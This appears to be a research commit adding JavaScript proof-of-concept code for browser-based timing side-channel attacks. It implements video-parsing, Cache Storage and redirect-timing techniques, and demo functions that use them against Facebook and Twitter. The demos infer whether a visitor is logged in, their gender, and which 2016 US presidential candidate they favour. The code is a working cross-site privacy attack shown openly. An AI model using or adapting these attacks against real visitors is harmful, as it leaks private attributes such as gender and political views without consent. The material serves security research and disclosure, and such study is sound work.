c0f7f64b5bea51fcd3deec079881c3eb828e74f1
Tom Van Goethem <tomvangoethem@gmail.com>
2016-08-01 00:34:23 -0400

    init

---
+++ browser-based-timing-attacks/attack-examples.js
@@ -0,0 +1,122 @@
+window.addEventListener('load', function() {
+	function loginCheck() {
+		var selectEl = document.getElementById('login-select');
+		var url = selectEl.value;
+
+		var buttonEl = document.getElementById('login-button');
+		buttonEl.disabled = true;
+		var debugEl = document.getElementById('login-debug');
+		var resultEl = document.getElementById('login-result');
+		resultEl.textContent = '';
+		
+		function _updateStatus(status) {
+			updateStatus(debugEl, startTime, status)
+		}
+		var hasRedirect = window.timingAttacks.hasRedirect;
+		initStatus(debugEl);
+		var startTime = window.performance.now();
+		if (!hasRedirect.canRun()) {
+			_updateStatus('ERROR: Your browser does not support this attack');
+			buttonEl.disabled = false;
+			return;
+		}
+		_updateStatus('Attack initiated');
+		hasRedirect(url, _updateStatus).then(function(redirectResult) {
+			if (redirectResult) {
+				resultEl.textContent = 'NOT LOGGED IN';
+			}
+			else {
+				resultEl.textContent = 'LOGGED IN';
+			}
+			buttonEl.disabled = false;
+		}).catch(function(errMsg) {
+			_updateStatus('ERROR: ' + errMsg);
+		});
+	}
+
+	function fbGender() {
+		var buttonEl = document.getElementById('fb-gender-button');
+		buttonEl.disabled = true;
+		var resultEl = document.getElementById('fb-gender-result');
+		resultEl.textContent = '';
+		var debugEl = document.getElementById('fb-gender-debug');
+		var cacheStorageAttack = window.timingAttacks.cacheStorage;
+
+		var maleUrl = 'https://www.facebook.com/labs.tom.vg/posts/135036256933426';
+		var femaleUrl = 'https://www.facebook.com/labs.tom.vg/posts/135040183599700';
+
+		initStatus(debugEl);
+		var startTime = window.performance.now();
+
+		function _updateStatus(status) {
+			updateStatus(debugEl, startTime, status)
+		}
+		if (!cacheStorageAttack.canRun()) {
+			_updateStatus('ERROR: Your browser does not support this attack');
+			return;
+		}
+		_updateStatus('Attack initiated, obtaining measurements for first resource');
+		cacheStorageAttack(maleUrl, _updateStatus).then(function(maleResult) {
+			_updateStatus('Obtaining measurements for second resource');
+			cacheStorageAttack(femaleUrl, _updateStatus).then(function(femaleResult) {
+				_updateStatus('Male median: ' + maleResult + ', female median: ' + femaleResult);
+				var gender = maleResult > femaleResult ? 'male' : 'female';
+				_updateStatus('Found target to be ' + gender.toUpperCase());
+				resultEl.textContent = 'You are probably ' + gender.toUpperCase();
+				buttonEl.disabled = false;
+			});
+		}).catch(function(errMsg) {
+			_updateStatus('ERROR: ' + errMsg);
+		});
+	}
+
+	function twitterCandidate() {
+		var buttonEl = document.getElementById('twitter-candidate-button');
+		buttonEl.disabled = true;
+		var resultEl = document.getElementById('twitter-candidate-result');
+		resultEl.textContent = '';
+		var debugEl = document.getElementById('twitter-candidate-debug');
+		var videoParsingAttack = window.timingAttacks.videoParsing;
+		var cacheStorageAttack = window.timingAttacks.cacheStorage;
+
+		var attackToUse = videoParsingAttack.canRun() ? videoParsingAttack : cacheStorageAttack;
+
+		var trumpUrl = 'https://twitter.com/realDonaldTrump/followers_you_follow/users?include_available_features=1&include_entities=1&max_position=9999999999999999&reset_error_state=false';
+		var hillaryUrl = 'https://twitter.com/HillaryClinton/followers_you_follow/users?include_available_features=1&include_entities=1&max_position=9999999999999999&reset_error_state=false';
+
+		initStatus(debugEl);
+		var startTime = window.performance.now();
+
+		function _updateStatus(status) {
+			updateStatus(debugEl, startTime, status)
+		}
+
+		_updateStatus('Attack initiated, obtaining measurements for Hillary Clinton');
+		attackToUse(hillaryUrl, _updateStatus).then(function(hillaryResult) {
+			_updateStatus('Obtaining measurements for Donald Trump');
+			attackToUse(trumpUrl, _updateStatus).then(function(donaldResult) {
+				_updateStatus('Hillary median: ' + hillaryResult + ', Donald median: ' + donaldResult);
+				var favCandidate = hillaryResult > donaldResult ? 'Hillary Clinton' : 'Donald Trump';
+				_updateStatus('Found favorite candidate to be ' + favCandidate);
+				resultEl.textContent = 'The next president of the US: ' + favCandidate;
+				buttonEl.disabled = false;
+			});
+		}).catch(function(errMsg) {
+			_updateStatus('ERROR: ' + errMsg);
+		});
+	}
+
+	function initStatus(el) {
+		el.textContent = 'DEBUG\n' +
+						 '---------------------------------------------------------------\n';
+	}
+
+	function updateStatus(el, startTime, status) {
+		var elapsed = (window.performance.now() - startTime).toFixed(2);
+		el.textContent = el.textContent + elapsed + 's: ' + status + '\n';
+	}
+
+	document.getElementById('login-button').addEventListener('click', loginCheck);
+	document.getElementById('fb-gender-button').addEventListener('click', fbGender);
+	document.getElementById('twitter-candidate').addEventListener('click', twitterCandidate);
+});
---
+++ browser-based-timing-attacks/timing-attacks.js
@@ -0,0 +1,122 @@
+(function() {
+	function videoParsingAttack(url, updateStatus) {
+		var timeout = 3000;
+		return new Promise(function(resolve, reject) {
+			updateStatus('Collecting measurements for ' + (timeout/1000) + ' seconds');
+			var measurements = [];
+			var attackStart = window.performance.now();
+			setTimeout(function() {
+				updateStatus('Obtained ' + measurements.length + ' measurements');
+				resolve(median(measurements));
+			}, timeout);
+			(function getMeasurement() {
+				var v = document.createElement('video');
+				var start;
+				v.addEventListener('suspend', function() {
+					start = window.performance.now();
+				});
+				v.addEventListener('error', function() {
+					var end = window.performance.now();
+					measurements.push(end - start);
+					if (end - attackStart < timeout) {
+						getMeasurement();
+					}
+				});
+				v.src = url;
+			})();
+		});
+	}
+
+	function cacheStorageAttack(url, updateStatus) {
+		function putInCache(response) {
+			return new Promise(function(resolve) {
+				var bogusReq = new Request('foo');
+				caches.open('cache-storage-attack').then(function(cache) {
+					var start = window.performance.now();
+					cache.put(bogusReq, response.clone()).then(function() {
+						return cache.delete(bogusReq);
+					}).then(function() {
+						resolve(window.performance.now() - start);
+					});
+				});
+			});
+		}
+		return new Promise(function(resolve, reject) {
+			if (!window.hasOwnProperty('caches')) {
+				reject('Cache API is not supported.');
+			}
+			if (!window.hasOwnProperty('fetch')) {
+				reject('Fetch API is not supported.');
+			}
+			var timeout = 2000;
+			var measurements = [];
+			fetch(url, {mode: 'no-cors', credentials: 'include'}).then(function(response) {
+				// make sure that resource is fully downloaded
+				putInCache(response).then(function(x) {
+					updateStatus('Resource downloaded');
+					var attackStart = window.performance.now();
+					var callback = function(measurement) {
+						measurements.push(measurement);
+						if (window.performance.now() - attackStart < timeout) {
+							putInCache(response).then(callback);
+						}
+						else {
+							updateStatus('Obtained ' + measurements.length + ' measurements, only using median')
+							resolve(median(measurements));
+						}
+					}
+					putInCache(response).then(callback);
+				});
+			});
+		});
+	}
+
+	function hasRedirect(url, updateStatus) {
+		return new Promise(function(resolve, reject) {
+			var start = window.performance.now();
+			var numAlready = performance.getEntriesByName(url).length;
+			fetch(url, {mode: 'no-cors', credentials: 'include'}).then(function() {
+				updateStatus('First bytes of response received');
+				var timeout = setTimeout(function() {
+					clearInterval(interval);
+					reject('ERROR: resource timed out after 5 seconds');
+				}, 5000);
+				var interval = setInterval(function() {
+					if (performance.getEntriesByName(url).length > numAlready) {
+						clearInterval(interval);
+						clearTimeout(timeout);
+						var entries = performance.getEntriesByName(url);
+						var fetchStart = entries[entries.length-1].fetchStart;
+						updateStatus('Time between actual start and fetchStart: ' + (fetchStart - start));
+						resolve(Math.abs(fetchStart - start) > 10);
+					}
+				}, 1);
+			});
+		});
+	}
+
+	function median(values) {
+		values.sort( function(a,b) {return a - b;} );
+		var half = Math.floor(values.length/2);
+		if(values.length % 2)
+			return values[half];
+		else
+			return (values[half-1] + values[half]) / 2.0;
+	}
+
+	hasRedirect.canRun = function() {
+		return window.hasOwnProperty('performance') && window.performance.getEntriesByName;
+	}
+	cacheStorageAttack.canRun = function() {
+		return window.hasOwnProperty('caches') && window.hasOwnProperty('fetch');
+	};
+	videoParsingAttack.canRun = function() {
+		return navigator.userAgent.indexOf('Chrome') !== -1;
+	}
+
+	window.timingAttacks = {
+		'hasRedirect': hasRedirect,
+		'cacheStorage': cacheStorageAttack,
+		'videoParsing': videoParsingAttack
+	}
+})();
